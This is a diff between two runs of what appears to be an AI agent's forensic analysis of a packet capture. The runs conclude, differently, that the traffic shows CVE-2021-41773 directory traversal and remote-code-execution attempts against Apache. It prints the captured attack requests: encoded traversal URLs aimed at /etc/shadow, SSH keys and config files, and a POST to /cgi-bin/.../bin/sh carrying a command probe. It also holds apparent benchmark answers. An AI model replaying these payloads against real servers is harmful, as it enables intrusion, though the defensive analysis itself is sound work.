@@ -1,96 +1,72 @@
 [Task 3]
-Step 1: Based on the provided summary of the PCAP file, it appears that there is consistent communication between two IP addresses (172.18.0.1 and 172.18.0.2) over port 80. This port is typically associated with HTTP traffic, which suggests that the service involved might be a web server or web application. However, to confirm the service or application involved, I need to extract HTTP requests and their headers from the PCAP file to identify any specific application or service names.
+Step 1: Based on the provided summary of the PCAP file, it appears that there is consistent communication between two IP addresses over port 80, which is typically associated with HTTP traffic. This suggests that the service involved is likely a web service or application. To confirm this, I will extract HTTP requests and their headers from the PCAP file to identify the specific service or application involved. 
 
-Let's proceed with extracting HTTP requests and their headers to identify the service or application involved.
+Let's proceed with this analysis.
 Step 2: Final report from the forensic expert:
-The analysis of the PCAP file revealed a series of HTTP GET requests targeting sensitive files and directories, indicative of a directory traversal attack. The requests attempted to access files such as `/etc/passwd`, `/etc/shadow`, and `/var/log/syslog`. However, all requests resulted in a "400 Bad Request" response, indicating that the server did not process them successfully. This suggests that the server may have security measures in place to block such attempts. No additional HTTP headers like `Referer` or `Accept` were present in the requests.
-Executed command: -Y "http.response" -T fields -e http.response.code -e http.response.phrase
+The analysis of the PCAP file revealed multiple HTTP GET requests attempting directory traversal, targeting sensitive files such as `/etc/passwd` and `/etc/shadow`. Additionally, a POST request was identified targeting `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` with a payload containing the command `echo;echo`. This indicates an attempt to exploit a vulnerability in the web server to execute arbitrary shell commands. The use of encoded sequences in the URIs and the POST request to a shell script suggest a targeted exploitation attempt.
+Executed command: -Y "http.request.method == POST" -x
 
-Command output: 400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
-400	Bad Request
+Command output: 0000  02 42 ac 12 00 02 02 42 e5 cf 0b c4 08 00 45 00   .B.....B......E.
+0010  00 da c5 f5 40 00 40 06 1c 01 ac 12 00 01 ac 12   ....@.@.........
+0020  00 02 95 f2 00 50 6e f3 b5 b5 ac 07 df a3 80 18   .....Pn.........
+0030  01 f6 58 f4 00 00 01 01 08 0a 9f 45 07 ea 62 38   ..X........E..b8
+0040  e6 09 50 4f 53 54 20 2f 63 67 69 2d 62 69 6e 2f   ..POST /cgi-bin/
+0050  2e 25 32 65 2f 2e 25 32 65 2f 2e 25 32 65 2f 2e   .%2e/.%2e/.%2e/.
+0060  25 32 65 2f 62 69 6e 2f 73 68 20 48 54 54 50 2f   %2e/bin/sh HTTP/
+0070  31 2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c   1.1..Host: local
+0080  68 6f 73 74 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65   host..Content-Le
+0090  6e 67 74 68 3a 20 39 0d 0a 43 6f 6e 74 65 6e 74   ngth: 9..Content
+00a0  2d 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69   -Type: applicati
+00b0  6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72   on/x-www-form-ur
+00c0  6c 65 6e 63 6f 64 65 64 0d 0a 43 6f 6e 6e 65 63   lencoded..Connec
+00d0  74 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d 0a 65   tion: close....e
+00e0  63 68 6f 3b 65 63 68 6f                           cho;echo
 
 
-Step 3: The analysis of the PCAP file has revealed a series of HTTP GET requests targeting sensitive files and directories, indicative of a directory traversal attack. The requests attempted to access files such as `/etc/passwd`, `/etc/shadow`, and `/var/log/syslog`. However, all requests resulted in a "400 Bad Request" response, indicating that the server did not process them successfully. This suggests that the server may have security measures in place to block such attempts.
 
-To proceed, I need to identify the relevant CVE associated with directory traversal attacks on web servers or applications. I will perform a web search to find the latest information on CVEs related to directory traversal attacks.
-Step 4: Search result for query: 'CVE directory traversal attack web server'
-Information 1: as Directory Traversal (CWE-35), is a vulnerability that allows an attacker to read arbitrary files present on the server hosting a web application. In some cases, this vulnerability can even allow an attacker to write files or modify their paths, altering the behavior of the web application or, in the worst-case scenario, completely compromising the server. How does it work? Let’s imagine having a web application that allows users to search for images and display them on a page. After performing a search, 
-Information 2: s Contact Us Hacking Web Servers Directory Traversal Attacks on Web Servers Jan, 2025 Table of Contents Contribute 5 min read @usefulcodes 🥇 Directory Traversal AttacksHow Directory Traversal Exploits WorkIdentifying Vulnerable Web ApplicationsExploiting File Disclosure VulnerabilitiesTools Used in Directory Traversal ExploitsSummary If you're looking to enhance your understanding of web server vulnerabilities, you can get training directly from this article. Directory traversal attacks are a fundamental co
-Information 3: ile Disclosure VulnerabilitiesTools Used in Directory Traversal ExploitsSummary If you're looking to enhance your understanding of web server vulnerabilities, you can get training directly from this article. Directory traversal attacks are a fundamental concept in web security that every developer, security analyst, and ethical hacker should be familiar with. This article will provide a comprehensive exploration of what directory traversal attacks are, how they work, and how to identify and exploit such vul
-Information 4: nerabilities. Let's dive deeper into this critical topic to understand how attackers manipulate web servers to access unauthorized files.Directory Traversal AttacksDirectory traversal attacks, also known as path traversal attacks, are one of the most common vulnerabilities in web applications. These attacks target web servers to gain unauthorized access to files and directories outside of the web application's root directory. Through maliciously crafted requests, attackers can exploit poorly implemented inp
-Information 5: 2142 Directory traversal vulnerability in FTP server allows remote authenticated attackers to list arbitrary directories via a "\.." sequence in an LS command. CVE-2002-0160 The administration function in Access Control Server allows remote attackers to read HTML, Java class, and image files outside the web root via a "..\.." sequence in the URL to port 2002. CVE-2001-0467 "\..." in web server CVE-2001-0963 "..." in cd command in FTP server CVE-2001-1193 "..." in cd command in FTP server CVE-2001-1131 "..."
-Step 5: 
-Step 6: Stored memory 71144951-b64a-49df-8435-2e18b816b77e
-Step 7: The analysis of the PCAP file has revealed a series of HTTP GET requests targeting sensitive files and directories, indicative of a directory traversal attack. The requests attempted to access files such as `/etc/passwd`, `/etc/shadow`, and `/var/log/syslog`. However, all requests resulted in a "400 Bad Request" response, indicating that the server did not process them successfully. This suggests that the server may have security measures in place to block such attempts.
+Step 3: 
+Step 4: Search result for query: 'CVE associated with directory traversal and remote code execution in web servers'
+Information 1: ould use a path traversal attack to map URLs to files outside the expected document root.” Further information can be found here. This would allow an attacker to retrieve sensitive files on the server, such as configuration files that contain credentials for example. Furthermore, researchers have found a way to leverage this into remote code execution – allowing an unauthenticated attacker to run commands on the affected server The CVE is currently being exploited in the wild by malicious actors – as such w
+Information 2: ers are vulnerable to attacks on CVE-2021-41773, a vulnerability that the Apache Foundation said was already under active exploit earlier this week when it was first disclosed and patched. Officially listed as path traversal bug that gives attackers the ability to see file locations without permission, the bug has since been confirmed by multiple researchers to enable remote code execution. This could give threat actors complete control of the server. Ash Daulton of the cPanel Security Team was credited wit
+Information 3:  code execution: If the attacker can access executable files, they may be able to execute arbitrary code on the system, potentially gaining full control.Denial of service: By consuming system resources or triggering errors, the attacker could disrupt the normal operation of the application or server.Proof of ConceptBuilding a lab environment for CVE-2024-23334 is simple. We just need to install the vulnerable version of aiohttp and host a server that include static routes with follow_symlinks attribute set 
+Information 4: d HTTP requests, attackers can gain unauthorized access to restricted resources, manipulate server configurations, and execute malicious commands. This vulnerability is particularly dangerous due to Apache Tomcat’s widespread use in enterprise environments, where successful exploitation could lead to privilege escalation, data exfiltration, and lateral movement across networks. IMPACT Remote Code Execution: CVE-2025-24813 allows attackers to execute arbitrary code remotely, leading to full system compromise
+Information 5: Apache HTTP Server Path Traversal and Remote Code Execution Search the blog Beagle SecurityResources RESOURCE CENTERBlog Newsletter Vulnerability Index Guides Whitepapers FREE TOOLSWebsite Security Assessment SSL Certificate Checker Domain Expiry Checker HELP AND SUPPORTHelp Center Developer Hub Features Pricing Product tour Log out Free trial DashboardApache HTTP Server Path Traversal and Remote Code ExecutionByJijith RajanPublished on18 Oct 2021 1 min read Table of contentsHow to prevent the vulnerability
+Step 5: The analysis of the PCAP file and the subsequent web search have identified that the service involved is likely a web server, and the CVE associated with the observed directory traversal and remote code execution attempts is CVE-2021-41773. This CVE is known to affect Apache HTTP Server, allowing attackers to perform path traversal and potentially execute arbitrary code.
 
-I have identified that directory traversal attacks are a common vulnerability in web applications, often associated with CVEs. However, I need to determine if the specific web server or application involved in this case is vulnerable to such attacks and if the attack was successful.
+Next, I will gather evidence of malicious activities associated with this CVE by analyzing the PCAP file for signs of remote code execution attempts, such as unusual command execution patterns or responses indicating successful exploitation.
 
-To proceed, I will use the "tshark_expert" to extract more detailed information about the HTTP requests and responses, focusing on any specific application or service names that might be present in the headers or payloads. This will help confirm the service involved and assess its vulnerability.
+Let's proceed with this analysis.
+Step 6: Final report from the forensic expert:
+The analysis of the PCAP file revealed multiple HTTP requests attempting directory traversal to access sensitive files such as `/etc/passwd` and `/etc/shadow`. Additionally, a POST request was made to `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`, indicating an attempt to execute a shell command on the server. The payload of this POST request, when translated from hexadecimal to ASCII, revealed the command `echo;echo`, suggesting an attempt to execute commands on the server. This pattern is indicative of a potential remote code execution attempt.
+Executed command: -Y "http.request.method == \"POST\"" -T fields -e http.file_data
+
+Command output: 6563686f3b6563686f
+
+
+Step 7: 
 Step 8: Final report from the forensic expert:
-The analysis focused on extracting HTTP requests and their headers to identify any specific application or service names. Initially, the HTTP host and user agent fields were extracted, revealing only 'localhost' for the host and no user agent information. This suggested that the HTTP requests were made to a local server, with no specific application or service names in the user agent field. Attempts to extract additional headers like 'http.server' and 'http.x_powered_by' were unsuccessful due to invalid field names. Despite efforts to find correct field names in the manuals, no relevant information was found. Therefore, the analysis concludes that the PCAP file does not contain identifiable application or service names in the HTTP headers.
-Executed command: -Y "http.request" -T fields -e http.host -e http.user_agent
+The HTTP response status codes extracted from the PCAP file were all 400, indicating 'Bad Request'. This suggests that any remote code execution attempts were unsuccessful as the requests were not properly formed or understood by the server.
+Executed command: -Y "http.response" -T fields -e http.response.code
 
-Command output: localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-localhost	
-
-
-Step 9: The analysis of the PCAP file has revealed a series of HTTP GET requests targeting sensitive files and directories, indicative of a directory traversal attack. The requests attempted to access files such as `/etc/passwd`, `/etc/shadow`, and `/var/log/syslog`. However, all requests resulted in a "400 Bad Request" response, indicating that the server did not process them successfully. This suggests that the server may have security measures in place to block such attempts.
-
-I have identified that directory traversal attacks are a common vulnerability in web applications, often associated with CVEs. However, I need to determine if the specific web server or application involved in this case is vulnerable to such attacks and if the attack was successful.
-
-To proceed, I will use the "tshark_expert" to extract more detailed information about the HTTP requests and responses, focusing on any specific application or service names that might be present in the headers or payloads. This will help confirm the service involved and assess its vulnerability.
-Step 10: Final report from the forensic expert:
-The analysis of the HTTP traffic in the provided PCAP file revealed attempts to access sensitive files and directories on the server, such as `/etc/passwd`, `/etc/shadow`, and `/var/log/syslog`. These requests are indicative of directory traversal attacks, where the attacker tries to access files outside the web server's root directory. The HTTP requests and responses did not reveal any specific application or service names in the headers or payloads. Attempts to extract additional HTTP headers for application or service names were unsuccessful due to invalid field names.
-Executed command: -Y "http" -T fields -e http.request.full_uri -e http.response.code -e http.host -e http.user_agent
-
-Command output: http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/group		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/group	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.bash_history		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.bash_history	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/authorized_keys		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/authorized_keys	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/syslog		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/syslog	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/auth.log		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/auth.log	400		
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/config.php		localhost	
-http://localhost/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/config.php	400		
-http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh		localhost	
-http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh	400		
+Command output: 400
+400
+400
+400
+400
+400
+400
+400
+400
+400
+400
 
 
-Step 11: 
-Step 12: FINAL REPORT:
-The analysis of the PCAP file revealed a series of HTTP GET requests targeting sensitive files and directories, indicative of a directory traversal attack. The requests attempted to access files such as `/etc/passwd`, `/etc/shadow`, and `/var/log/syslog`. However, all requests resulted in a "400 Bad Request" response, indicating that the server did not process them successfully. This suggests that the server may have security measures in place to block such attempts. The HTTP requests and responses did not reveal any specific application or service names in the headers or payloads. Attempts to extract additional HTTP headers for application or service names were unsuccessful due to invalid field names. The server was identified as a web server, likely vulnerable to directory traversal attacks, but the attack was not successful due to the server's security measures.
+Step 9: 
+Step 10: FINAL REPORT:
+The analysis of the PCAP file revealed multiple HTTP requests attempting directory traversal to access sensitive files such as `/etc/passwd` and `/etc/shadow`. Additionally, a POST request was made to `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`, indicating an attempt to execute a shell command on the server. The payload of this POST request, when translated from hexadecimal to ASCII, revealed the command `echo;echo`, suggesting an attempt to execute commands on the server. This pattern is indicative of a potential remote code execution attempt. However, the HTTP response status codes extracted from the PCAP file were all 400, indicating 'Bad Request'. This suggests that any remote code execution attempts were unsuccessful as the requests were not properly formed or understood by the server.
 REPORT SUMMARY:
-Identified CVE: CVE-2001-0467
-Affected Service: web server
+Identified CVE: CVE-2021-41773
+Affected Service: Apache HTTP Server
 Is Service Vulnerable: True
 Attack succeeded: False
 
